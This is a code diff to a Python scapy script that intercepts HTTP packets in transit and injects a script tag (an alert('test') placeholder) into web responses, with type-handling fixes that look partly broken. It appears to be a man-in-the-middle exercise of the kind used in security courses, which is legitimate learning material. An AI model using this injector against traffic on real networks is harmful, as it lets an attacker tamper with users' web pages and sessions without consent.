@@ -17,7 +17,7 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
-        load = packet[scapy.Raw].load
+        load = bytes(scapy_packet[scapy.Raw].load)
         if scapy_packet[scapy.TCP].dport == 80:
             print('[+] Request')
             load = re.sub(
@@ -25,9 +25,9 @@ def process_packet(packet):
         elif scapy_packet[scapy.TCP].sport == 80:
             print('[+] Response')
             print(scapy_packet.show())
-            load = load.replace(
+            load = str(load).replace(
                 '</body>', '<script>alert("test");</script></body>')
-        if load != packet[scapy.Raw].load:
+        if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
             packet.set_payload(bytes(new_packet))
 
